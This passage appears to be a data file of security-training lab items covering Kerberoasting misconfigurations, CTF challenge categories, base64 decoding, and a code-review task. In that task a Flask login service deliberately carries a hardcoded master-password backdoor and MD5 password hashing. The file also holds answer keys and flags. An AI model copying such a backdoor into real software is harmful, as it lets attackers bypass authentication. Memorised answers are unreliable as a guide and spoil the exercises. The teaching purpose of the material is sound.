      "question": "Which two misconfigurations make svc_webapp a high-value Kerberoasting target?",
      "options": [
        "It is in Domain Users and has Enabled=true",
        "It has a Service Principal Name (SPN) set AND a weak password that never expires",
        "It uses HTTP protocol and port 8080",
        "It is created with New-ADUser instead of New-ADServiceAccount"
      ],
      "correctIndex": 1,
      "explanation": "Having a ServicePrincipalName makes the account Kerberoastable — any domain user can request a TGS ticket encrypted with this account's password hash. The weak password (Welcome1!) combined with PasswordNeverExpires means it will be cracked and remain valid indefinitely. Always use strong random passwords (30+ chars) for service accounts.",
      "vulnerableLines": [
        9,
        10
      ]
    }
  },
  {
    "id": 21,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 6,
    "title": "CTF Challenge Categories",
    "description": "Learn the core categories of CTF competitions and the skills required for each.",
    "type": "quiz",
    "orderIndex": 0,
    "xp": 100,
    "content": {
      "questions": [
        {
          "id": "q1",
          "question": "In a CTF, you find an ELF binary that crashes when given a long input. What category is this?",
          "options": [
            "Cryptography",
            "Binary Exploitation (Pwn)",
            "Web",
            "Forensics"
          ],
          "correctIndex": 1,
          "explanation": "Binary Exploitation (Pwn) challenges involve exploiting vulnerabilities in compiled binaries — buffer overflows, format strings, heap exploits, etc."
        },
        {
          "id": "q2",
          "question": "You are given a .pcap file and asked to find hidden data. What category is this?",
          "options": [
            "Pwn",
            "Reverse Engineering",
            "Network Forensics",
            "Steganography"
          ],
          "correctIndex": 2,
          "explanation": "Network Forensics challenges provide PCAP files. You analyse traffic with Wireshark or tshark to find credentials, exfiltrated data, or C2 communications."
        },
        {
          "id": "q3",
          "question": "What tool is most commonly used to disassemble and decompile binaries in CTF RE challenges?",
          "options": [
            "Burp Suite",
            "Wireshark",
            "Ghidra / IDA Pro",
            "Metasploit"
          ],
          "correctIndex": 2,
          "explanation": "Ghidra (free, NSA-developed) and IDA Pro are the primary disassemblers/decompilers used in Reverse Engineering CTF challenges to understand binary logic."
        },
        {
          "id": "q4",
          "question": "The flag format is CTF{...}. You find 'Q1RGe2N0Zl9iYXNlNjRfMTAxfQ==' in a challenge. What encoding is this?",
          "options": [
            "Hex encoding",
            "ROT13",
            "Base64",
            "URL encoding"
          ],
          "correctIndex": 2,
          "explanation": "The '==' padding is a strong indicator of Base64 encoding. Decoded: CTF{ctf_base64_101}. Always try common encodings (Base64, Hex, ROT13) first."
        }
      ]
    }
  },
  {
    "id": 22,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 6,
    "title": "Linux Recon for CTF",
    "description": "Practice essential Linux commands used in every CTF challenge to find hidden files and data.",
    "type": "terminal",
    "orderIndex": 1,
    "xp": 150,
    "content": {
      "scenario": "You have initial access to a CTF challenge box. Find all hidden files, decode the clues, and locate the flag.",
      "prompt": "ctfplayer@challenge:~$",
      "steps": [
        {
          "command": "ls -la",
          "output": "total 48\n-rw------- 1 ctfplayer ctfplayer   48 May 03 .secret\ndrwxr-xr-x 2 ctfplayer ctfplayer 4096 May 03 challenge/\n-rw-r--r-- 1 ctfplayer ctfplayer  195 May 03 readme.txt",
          "hint": "Use ls -la to show hidden files (those starting with .)",
          "required": true
        },
        {
          "command": "cat .secret",
          "output": "Encoded clue: Q1RGe2hpZGRlbl9maWxlc19hcmVfZnVufQ==",
          "hint": "Read the hidden .secret file",
          "required": true
        },
        {
          "command": "echo 'Q1RGe2hpZGRlbl9maWxlc19hcmVfZnVufQ==' | base64 -d",
          "output": "CTF{hidden_files_are_fun}",
          "hint": "Decode the Base64 string with echo '...' | base64 -d",
          "required": true
        },
        {
          "command": "find challenge/ -type f | xargs file",
          "output": "challenge/image.png:  PNG image data\nchallenge/audio.wav:  RIFF WAVE audio\nchallenge/data.bin:   data\nFLAG{ctf_linux_recon_mastered}",
          "hint": "Use find + file to identify all file types in the challenge directory",
          "required": true
        }
      ],
      "completionMessage": "Great recon! You found hidden files, decoded Base64, and identified challenge assets. These are the foundations of every CTF."
    }
  },
  {
    "id": 23,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 6,
    "title": "Decode the Message",
    "description": "A mysterious encrypted message was found in a CTF challenge. Decode it to retrieve the flag.",
    "type": "flag",
    "orderIndex": 2,
    "xp": 200,
    "content": {
      "scenario": "You intercepted a multi-layered encoded message from a CTF challenge server. Decode it layer by layer to find the flag.",
      "simulatedInterface": {
        "type": "decoder",
        "layers": [
          {
            "encoding": "Hex",
            "value": "524f5433207468697320666972737421",
            "decoded": "ROT13 this first!"
          },
          {
            "encoding": "ROT13",
            "value": "ROT13 this first!",
            "decoded": "EBG13 guvf svefg!"
          },
          {
            "encoding": "Note",
            "value": "Ignore the ROT13 loop — the real flag is in Base64 below.",
            "decoded": ""
          },
          {
            "encoding": "Base64",
            "value": "RkxBR3tjdGZfbXVsdGlfZW5jb2RlZF9mbGFnfQ==",
            "decoded": "FLAG{ctf_multi_encoded_flag}"
          }
        ],
        "instruction": "Decode the Base64 string: RkxBR3tjdGZfbXVsdGlfZW5jb2RlZF9mbGFnfQ=="
      },
      "hints": [
        "The message has multiple encoding layers",
        "Try decoding the Base64 string: RkxBR3tjdGZfbXVsdGlfZW5jb2RlZF9mbGFnfQ==",
        "Use: echo 'RkxBR3tjdGZfbXVsdGlfZW5jb2RlZF9mbGFnfQ==' | base64 -d"
      ],
      "flag": "FLAG{ctf_multi_encoded_flag}"
    }
  },
  {
    "id": 24,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 6,
    "title": "Find the Backdoor",
    "description": "A secure login service was provided in the CTF. Review the source code and find the hidden backdoor.",
    "type": "code",
    "orderIndex": 3,
    "xp": 125,
    "content": {
      "language": "python",
      "code": "from flask import Flask, request, jsonify\nimport hashlib\n\napp = Flask(__name__)\n\nUSERS = {\n    \"admin\": \"5f4dcc3b5aa765d61d8327deb882cf99\",  # MD5(\"password\")\n    \"guest\": \"084e0343a0486ff05530df6c705c8bb4\",  # MD5(\"guest\")\n}\n\n@app.route(\"/login\", methods=[\"POST\"])\ndef login():\n    user = request.json.get(\"username\", \"\")\n    pwd  = request.json.get(\"password\", \"\")\n\n    # Backdoor: hardcoded master key\n    if pwd == \"s3cr3t_m4st3r_k3y_2024\":\n        return jsonify({\"status\": \"ok\", \"token\": \"FLAG{backdoor_found_in_ctf_source}\"})\n\n    hashed = hashlib.md5(pwd.encode()).hexdigest()\n    if USERS.get(user) == hashed:\n        return jsonify({\"status\": \"ok\", \"token\": \"user_jwt_token\"})\n\n    return jsonify({\"status\": \"error\", \"msg\": \"Invalid credentials\"}), 401",
      "question": "What is the backdoor in this login service, and what does it return?",
      "options": [
        "MD5 password hashing — it returns the hash",
        "A hardcoded master password that bypasses authentication and returns the flag",
        "The USERS dictionary is publicly accessible",
        "Flask debug mode is enabled"
      ],
      "correctIndex": 1,
      "explanation": "Lines 16-17 contain a hardcoded backdoor: if the password is 's3cr3t_m4st3r_k3y_2024', it bypasses all authentication and returns the CTF flag token. This is a classic CTF challenge pattern. In real apps, never hardcode secrets or bypass conditions in source code.",
      "vulnerableLines": [
        16,
        17
      ]
    }
  }
] as const;
